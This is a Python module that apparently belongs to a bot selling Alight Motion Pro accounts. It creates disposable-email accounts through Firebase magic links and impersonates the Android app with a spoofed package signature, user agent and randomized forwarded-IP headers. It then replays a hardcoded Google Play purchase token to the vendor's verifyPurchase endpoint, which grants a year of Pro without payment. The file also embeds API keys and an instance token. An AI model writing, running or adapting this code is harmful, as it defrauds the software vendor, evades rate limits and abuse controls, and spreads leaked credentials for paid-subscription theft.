"""Alight Motion Pro activation engine — Python port of the AM Auto Regist script.

Flow (6 HTTP calls, no Node.js needed):
  1. make_email()      -> random disposable email from the domain pool
  2. send_link(email)  -> ask Google Firebase to email a sign-in magic link
  3. check_inbox(email)-> poll emailqu.com until the magic email arrives
  4. extract_oob_code()-> pull the oobCode out of the magic link
  5. sign_in(email,oob)-> Firebase emailLinkSignin, disguised as the AM Android app
  6. activate(id_tok)  -> Alight's verifyPurchase cloud function (the "receipt" step)

Then get_fresh_login_link() requests one more magic link so the customer gets
an unused login link.

Single point of failure: PURCHASE_TOKEN. If Alight revokes it, every call to
activate() fails — the bot surfaces that as "temporarily unavailable".
"""

import json
import os
import random
import re
import time
from datetime import datetime

import requests

# ── Alight Motion / Firebase credentials (from the AM script) ────────────────
FIREBASE_SEND_KEY = "AIzaSyDrZ9jr_Y16ltSBqsQR5IH6I04FRga6Ki0"
# NOTE (2026-10-16): the script's original sign-in key
# (AIzaSyDtG1AU22ErbQD60AzBAcaknySiz9_CEq0) is dead — Google returns
# "API key not valid". The send key works for emailLinkSignin too, so we use
# it for both steps.
FIREBASE_SIGNIN_KEY = FIREBASE_SEND_KEY
_REFERER = "https://alight-creative.firebaseapp.com"
VERIFY_PURCHASE_URL = "https://us-central1-alight-creative.cloudfunctions.net/verifyPurchase"
PRODUCT_ID = "am.full.sub.annual.19q4"
# The "receipt" — a Google Play purchase token Alight's server accepts.
PURCHASE_TOKEN = (
    "mmgaobamlahbbeccfplmbkbb.AO-J1OzqG0or_GJJIx-ms8GrTm-jaglCRfhQSRPUZKpl2YspYS-"
    "oN7_94uv8RC5vQbvd_Ios2pPDStZ2n7F0hLE3FiOU7HS3R6Fquulv5xLXFECSv4ctElw"
)

# ── Domain pool ──────────────────────────────────────────────────────────────
_PREFIXES = ["creator", "studio", "motion", "pro", "alight", "design", "vip", "editor", "prime"]
_DOMAINS = [
    "dingamouu.com", "broken.best", "flobati.space", "apimza.store", "exspro.site",
    "extraku.net", "ilysmdesi.com", "maghbiz.store", "kacung.me", "scento.cyou",
    "sakuw.store", "runatk.site", "kurmandika.com", "cempreng.me", "capemain.games",
    "daisychuu.com", "telor.studio", "ccsaku.shop", "capcute.fun", "kayyprem.shop",
    "trueword.space", "wikinime.com", "gamepass.games", "akunku.site", "tolong.engineer",
]
_DOMAINS_FILE = os.path.join(os.path.dirname(__file__), "am_domains.json")
try:
    with open(_DOMAINS_FILE, encoding="utf-8") as _f:
        _loaded = json.load(_f)
        if isinstance(_loaded, list) and _loaded:
            _DOMAINS = _loaded
except Exception:
    pass

_api_domain_ptr = random.randrange(max(1, len(_DOMAINS)))
_api_prefix_ptr = 0

_SESSION = requests.Session()
_SESSION.headers.update({
    "Content-Type": "application/json",
    "User-Agent": "AM-AutoRegist-Engine/1.0",
})

_OOB_RE = re.compile(r"oobCode(?:=|%3D|%253D)([-_a-zA-Z0-9]+)", re.I)


def make_email() -> str:
    """Invent a random disposable email address."""
    global _api_domain_ptr, _api_prefix_ptr
    pref = _PREFIXES[_api_prefix_ptr % len(_PREFIXES)]
    _api_prefix_ptr += 1
    dom = _DOMAINS[_api_domain_ptr % len(_DOMAINS)]
    _api_domain_ptr += 1
    return f"{pref}_{random.randint(1000, 9999)}@{dom}"


def send_link(email: str) -> dict:
    """Ask Google Firebase to email an Alight Motion sign-in magic link."""
    email = email.strip()
    try:
        r = _SESSION.post(
            f"https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={FIREBASE_SEND_KEY}",
            json={
                "requestType": "EMAIL_SIGNIN",
                "email": email,
                "continueUrl": "https://alightcreative.com?ui_sid=0366624874&ui_sd=0",
                "canHandleCodeInApp": True,
            },
            headers={
                "Referer": _REFERER,
                "Origin": _REFERER,
            },
            timeout=10,
        )
        if r.status_code == 200:
            return {"success": True}
        try:
            msg = r.json().get("error", {}).get("message", "")
        except Exception:
            msg = r.text[:200]
        return {"success": False, "message": msg or f"HTTP {r.status_code}"}
    except Exception as e:
        return {"success": False, "message": str(e)[:200]}


def check_inbox(email: str) -> dict:
    """Poll emailqu.com for newly arrived mail for this address."""
    email = email.strip().lower()
    try:
        r = _SESSION.get(
            f"https://emailqu.com/api/public/emails/{email}",
            timeout=10,
        )
        data = r.json()
        emails = data.get("emails") if isinstance(data, dict) else None
        if isinstance(emails, list) and emails:
            return {"success": True, "data": emails}
    except Exception:
        pass
    return {"success": False, "data": []}


def extract_oob_code(inbox_data) -> str | None:
    """Pull the oobCode out of inbox message(s)."""
    if not inbox_data:
        return None
    if isinstance(inbox_data, str):
        text = inbox_data
    elif isinstance(inbox_data, dict):
        html = inbox_data.get("html")
        if isinstance(html, list):
            html = " ".join(html)
        text = (
            inbox_data.get("mail_body") or inbox_data.get("body_html")
            or inbox_data.get("body_text") or inbox_data.get("body")
            or html or inbox_data.get("text") or ""
        )
    elif isinstance(inbox_data, list):
        for msg in inbox_data:
            code = extract_oob_code(msg)
            if code:
                return code
        return None
    else:
        return None
    m = _OOB_RE.search(text)
    return m.group(1) if m else None


def build_login_link(oob: str) -> str | None:
    """Build the official Alight Motion app login link from an oobCode."""
    if not oob:
        return None
    return (
        "https://alight-creative.firebaseapp.com/__/auth/links"
        "?link=https://alightcreative.com/auth_action/?apiKey%3D"
        f"{FIREBASE_SEND_KEY}%26mode%3DsignIn%26oobCode%3D{oob}"
        "%26continueUrl%3Dhttps://alightcreative.com?ui_sid%253D0366624874%2526ui_sd%253D0%26lang%3Den"
    )


def _spoofed_ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _spoof_headers(base: dict) -> dict:
    """Match the original script's sp() — adds spoofed IP headers."""
    ip = _spoofed_ip()
    h = dict(base)
    h.update({
        "x-forwarded-for": ip,
        "x-real-ip": ip,
        "x-client-ip": ip,
        "x-originating-ip": ip,
        "x-cluster-client-ip": ip,
    })
    return h


# Hardcoded in the original script — sent with verifyPurchase.
_FIREBASE_INSTANCE_ID_TOKEN = (
    "cSDnCyp3T-uwp07z3tL86T:APA91bFkmvvsHw5nnqa1SBFci-99DRsKClLiETdRrVcJjS5yBx1v_"
    "FbCb1d8WhBuea_zmwnYBktyTIzcRhN4b6uNOUur9wPc0gKXmJDoZic0LhNq5V2s0xI"
)


def sign_in(email: str, oob: str) -> dict:
    """Exchange the oobCode for a Firebase idToken, disguised as the AM app."""
    email = email.strip()
    try:
        r = _SESSION.post(
            f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/emailLinkSignin?key={FIREBASE_SIGNIN_KEY}",
            json={"email": email, "oobCode": oob, "clientType": "CLIENT_TYPE_ANDROID"},
            headers=_spoof_headers({
                "content-type": "application/json",
                "referer": _REFERER,
                "x-android-package": "com.alightcreative.motion",
                "x-android-cert": "ECA6BF91B8715A6F810ED0BBFC65B6CD578F52A8",
                "user-agent": "dalvik/2.1.0 (linux; u; android 15; 23127pn0cc build/bp1a.250505.005)",
            }),
            timeout=15,
        )
        data = r.json()
        if data.get("idToken"):
            return {"success": True, "id_token": data["idToken"], "uid": data.get("localId")}
        try:
            msg = data.get("error", {}).get("message", "")
        except Exception:
            msg = ""
        return {"success": False, "message": msg or "sign-in failed"}
    except Exception as e:
        return {"success": False, "message": str(e)[:200]}


def activate(id_token: str) -> dict:
    """Call Alight's verifyPurchase — the step that grants 1-year Pro."""
    try:
        r = _SESSION.post(
            VERIFY_PURCHASE_URL,
            json={
                "data": {
                    "productId": PRODUCT_ID,
                    "token": PURCHASE_TOKEN,
                    "skuType": "subs",
                    "orderId": "neo-" + os.urandom(6).hex(),
                }
            },
            headers=_spoof_headers({
                "content-type": "application/json; charset=utf-8",
                "user-agent": "okhttp/3.12.1",
                "accept-encoding": "gzip",
                "authorization": f"Bearer {id_token}",
                "firebase-instance-id-token": _FIREBASE_INSTANCE_ID_TOKEN,
            }),
            timeout=25,
        )
        data = r.json()
        result = data.get("result", data)
        return {"success": True, "subscription": result}
    except Exception as e:
        return {"success": False, "message": str(e)[:200]}


def wait_for_oob(email: str, exclude_oob: str | None = None,
                 max_wait_s: int = 25, poll_s: float = 0.4) -> str | None:
    """Poll the inbox until a (new) oobCode arrives."""
    deadline = time.time() + max_wait_s
    while time.time() < deadline:
        time.sleep(poll_s)
        inbox = check_inbox(email)
        if inbox.get("success"):
            for msg in inbox["data"]:
                code = extract_oob_code(msg)
                if code and code != exclude_oob:
                    return code
    return None


def activate_account(email: str, max_wait_s: int = 25) -> dict:
    """Full flow for one email: link -> inbox -> sign-in -> activate -> fresh link.

    Returns {"success": True, "email":..., "login_link":...} or
            {"success": False, "message":..., "quota": True/False}.
    """
    email = email.strip()

    sent = send_link(email)
    if not sent["success"]:
        msg = sent.get("message", "")
        quota = "QUOTA_EXCEEDED" in msg or "quota" in msg.lower()
        return {"success": False, "message": msg or "could not send link", "quota": quota}

    oob = wait_for_oob(email, max_wait_s=max_wait_s)
    if not oob:
        return {"success": False, "message": "activation email did not arrive in time", "quota": False}

    signed = sign_in(email, oob)
    if not signed["success"]:
        msg = signed.get("message", "")
        quota = "QUOTA_EXCEEDED" in msg or "quota" in msg.lower()
        return {"success": False, "message": msg or "sign-in failed", "quota": quota}

    act = activate(signed["id_token"])
    if not act["success"]:
        return {"success": False, "message": act.get("message", "activation failed"), "quota": False}

    # Fresh unused login link for the customer (first link was consumed).
    send_link(email)
    fresh_oob = wait_for_oob(email, exclude_oob=oob, max_wait_s=12)
    login_link = build_login_link(fresh_oob) if fresh_oob else build_login_link(oob)

    return {"success": True, "email": email, "login_link": login_link}


def generate_account(max_wait_s: int = 25) -> dict:
    """Invent an email and activate it — for admin single/bulk generation."""
    return activate_account(make_email(), max_wait_s=max_wait_s)
